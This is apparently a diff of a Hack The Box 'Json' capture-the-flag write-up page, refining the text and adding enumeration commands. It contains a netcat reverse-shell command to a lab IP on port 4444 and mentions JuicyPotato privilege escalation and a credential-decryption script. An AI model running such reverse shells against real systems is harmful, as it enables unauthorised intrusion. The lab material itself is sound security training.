@@ -1,4 +1,4 @@
-I"A<h1 id="medium-json-">[MEDIUM] Json <br /></h1>
+I"�<h1 id="medium-json-">[MEDIUM] Json <br /></h1>
 
 <p><img src="/writeups/htb/boxes/images/json_1.png# icon" alt="Json icon" /></p>
 
@@ -387,7 +387,7 @@ And our python exploit - json_exploit.py</p>
 
 <h3 id="spawning-a-shell">Spawning a Shell</h3>
 
-<p>To spawn a shell wth this, we can upload netcat executable for windows then execute it also via the script with powershell or cmd execution.
+<p>To spawn a shell wth this, we can upload <a href="https://eternallybored.org/misc/netcat/">netcat executable for windows</a> then execute netcat exe with the python script with powershell or cmd execution.
 <br />
 Let’s first setup http server that contains the netcat executable. I used python3 http.server module. Execute the following.</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 json_exploit.py
@@ -399,8 +399,8 @@ And when the python script asks for its command, enter the following:</p>
 
 <p><img src="/writeups/htb/boxes/images/json_17.png" alt="17" />
 <br />
-After the netcat is uploaded, execute the following:</p>
-<pre><code class="language-Bash">Command: powershell.exe, /c c:\\Windows\\Temp\\nc.exe 10.10.14.87 4444 -e "cmd.exe'
+After the netcat is uploaded, enter the following to the python script:</p>
+<pre><code class="language-Bash">powershell.exe, /c c:\\Windows\\Temp\\nc.exe 10.10.14.87 4444 -e "cmd.exe'
 </code></pre>
 <p>NOTE:
 If “powershell.exe” is used immediately, the server doesn’t spawn a shell.</p>
@@ -408,7 +408,7 @@ If “powershell.exe” is used immediately, the server doesn’t spawn a shell.
 <p><br />
 We successfuly spawned a shell with “userpool” as our user!</p>
 
-<p><img src="/writeups/htb/boxes/images/json_18.png# big" alt="18" />
+<p><img src="/writeups/htb/boxes/images/json_18.png# medium" alt="18" />
 <br /></p>
 
 <h2 id="user-flag">User Flag</h2>
@@ -425,12 +425,17 @@ We successfuly spawned a shell with “userpool” as our user!</p>
 
 <h3 id="enumeration-1">Enumeration</h3>
 
-<p>We can check the privileges of our user. It’s stated that SeImpersonatePrivilege is enabled thus we can use an exploit that uses this setting to escalate to NT AUTHORITY\SYSTEM</p>
+<p>We can check the privileges of our user. It’s stated that SeImpersonatePrivilege is enabled thus we can use an exploit that uses this setting to escalate to NT AUTHORITY\SYSTEM
+To check privileges:</p>
+<pre><code class="language-cmd">whoami /priv
+</code></pre>
 
 <p><img src="/writeups/htb/boxes/images/json_20.png# big" alt="20" /></p>
 
-<p>Windows 2019 and Windows 10 1809 are unaffected by this but the version of Windows of the server is of earlier version.</p>
-
+<p>Windows 2019 and Windows 10 1809 are unaffected by this but the version of Windows of the server is of earlier version.
+To check system information:</p>
+<pre><code class="language-cmd">systeminfo
+</code></pre>
 <p><img src="/writeups/htb/boxes/images/json_21.png# big" alt="21" /></p>
 
 <h3 id="juicypotato-exploitation">JuicyPotato Exploitation</h3>
@@ -489,10 +494,10 @@ After retrieving the two files, it can now be checked that the executable is .NE
 <p><br /></p>
 
 <h3 id="reversing-the-net-executable">Reversing the .NET executable</h3>
-<p>To reverse or decompile the .NET executable, dotPeek is used. After reversing, there is a Encrypt() and Decrypt() function on the decompiled code.</p>
+<p>To reverse or decompile the .NET executable, <a href="https://www.jetbrains.com/decompiler/">dotPeek</a> is used. After reversing, there is a Encrypt() and Decrypt() function on the decompiled code.</p>
 
 <p><img src="/writeups/htb/boxes/images/json_26.png" alt="26" />
-Focusing on the Decrypt() function, it’s stated that it used 3DES-ECB as the encryption algorithm. A little problem is that it has <code class="highlighter-rouge">hashing</code> variable that decides whether or not to hash the key.</p>
+Focusing on the Decrypt() function, it’s stated that it used 3DES-ECB as the encryption algorithm. A little problem is that it has <code class="highlighter-rouge">useHashing</code> variable that decides whether or not to hash the key.</p>
 
 <h3 id="decrypting-username-and-password">Decrypting username and password</h3>
 <p>Here’s the written python script to decrypt the username and password.</p>
@@ -507,7 +512,9 @@ Focusing on the Decrypt() function, it’s stated that it used 3DES-ECB as the e
 <span class="s">'''
 Notice that key is not lenth 16 or 24, so
 it needs to be hashed using MD5 hash algo.
-It is also indicated in the reversed .NET exe
+It is also indicated in the reversed .NET executable.
+That's what also probably the useHashing 
+variable used for.
 '''</span>
 
 <span class="n">hh</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s">'md5'</span><span class="p">)</span>
